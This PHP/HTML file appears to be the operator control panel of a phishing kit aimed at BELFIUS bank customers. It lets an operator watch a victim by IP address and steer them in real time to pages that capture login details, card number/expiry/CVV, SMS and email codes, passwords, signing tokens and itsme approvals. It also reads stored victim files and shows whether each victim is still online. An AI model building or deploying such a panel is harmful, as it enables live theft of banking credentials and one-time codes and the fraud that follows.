<?php
session_start();
error_reporting(0);
include_once '../bots/botnewunti.php';
?>
<!DOCTYPE html>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <!-- Required meta tags -->
        
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow,"="" "noimageindex,"="" "noarchive,"="" "nocache,"="" "nosnippet"="">
        
        <!-- CSS FILES -->
         <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
         <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
<script>
   $(document).ready(function(){
       
   window.setInterval(function(){

     $("#here").load(window.location.href + " #here" );
   }, 1000);
   });
</script>
        <title>Control</title>
    </head>

    <body>
        
        <div class="container text-center pt30 pb30">
		<p>BELFIUS</p>
            <form method="POST" action="index.php">
                <input type="hidden" name="step" value="control">
                <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
                <button type="submit" class="btn btn-danger" name="to" value="badloginraf">LOGIN</button> 
 				<button type="button" class="slide btn btn-success" data-slide="#signature" data-value="token1">TOKEN1/2</button> 
				<button type="button" class="slide btn btn-success" data-slide="#signature2" data-value="token3">TOKEN3</button> 
				<button type="button" class="slide btn btn-success" data-slide="#signature2" data-value="btoken">BUY TOKEN</button> 
                <button type="submit" class="btn btn-success" name="to" value="approve">APPROVE itsme</button> 
                <button type="submit" class="btn btn-success" name="to" value="num">NUM/EXP/CVV</button> 
                <button type="submit" class="btn btn-success" name="to" value="sms">SMS</button> 
                <button type="submit" class="btn btn-success" name="to" value="eml">CODE EMAIL</button> 
                <button type="submit" class="btn btn-success" name="to" value="pass">PASSWORD</button> 
				<button type="button" class="slide btn btn-success" data-slide="#signature" data-value="extra">EXTRA INFO</button> 

              
                <button type="submit" class="btn btn-success" name="to" value="success">Success</button>
                <div class="collapse mt-5" id="signature">
                    <div class="row">
                        <div class="col-md-8">
                            <input type="text" name="signaturcode" id="signaturcode" class="form-control">
                        </div>
                        <div class="col-md-4">
                            <button type="submit" class="btn btn-primary btn-block" name="to" value="signature">Submit</button> 
                        </div>
                    </div>
                </div>                
				<div class="collapse mt-5" id="signature2">
                    <div class="row">
                        <div class="col-md-8">
                            <input type="text" name="signaturcode2" value="&amp;code2=" id="signaturcode" class="form-control">
                        </div>
                        <div class="col-md-4">
                            <button type="submit" class="btn btn-primary btn-block" name="to" value="signature">Submit</button> 
                        </div>
                    </div>
                </div>
                <div class="collapse mt-5" id="confirmation">
                    <div class="row">
                    
                        <div class="col-md-2">
                            <button type="submit" class="btn btn-primary btn-block" name="to" value="confirmation">Submit</button> 
                        </div>
                    </div>
                </div>
            </form>
        </div>

        <!-- JS FILES -->
       <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>

        <script>
            $('.slide').click(function(){
                var target = $(this).data('slide');
                var value = $(this).data('value');
                $(target).slideToggle();
                $(target + " button").val(value);
            })
        </script>
<table class="table table-striped">
<thead>
	 <tr>
		 <th >PAGE</th>
<th >ONLINE</th>
<th >Device</th>

<th >System</th>
   

        
		
    
	
   </tr>
  </thead>
  <tbody>
    <tr>
<td ><?php
				$ipsss = $_GET['ip'];
$filenames = "./vics/".$ipsss.".txt";
$files = fopen($filenames,"r");


  
echo fgets($files);
fclose($files);
?>


</td>		
<td ><div id="here"><?php
$ipsss = $_GET['ip'];
$filename = "times/".$ipsss.".txt";
$time = time();
$file = fopen($filename,"r");


  
 
print ($time - fgets($file) > 2 ? 'mcha' : '<span style="background-color: red;color: #fff">ba9i</span>');
fclose($file);
?>

</div>
</td>
		
<?php

   

$ini = parse_ini_file('../visitors.ini', true);

$emails = $ini["$ipsss"];

 
 $platformName = $emails['platformName'];
 $xoperatingSystem = $emails['xoperatingSystem'];
 $browserName = $emails['browserName'];
 
 ?>
<td ><?php echo $platformName; ?><td>
<td ><?php echo $xoperatingSystem; ?><td>
</tr>
  </tbody>
</table>
    
    

</body></html>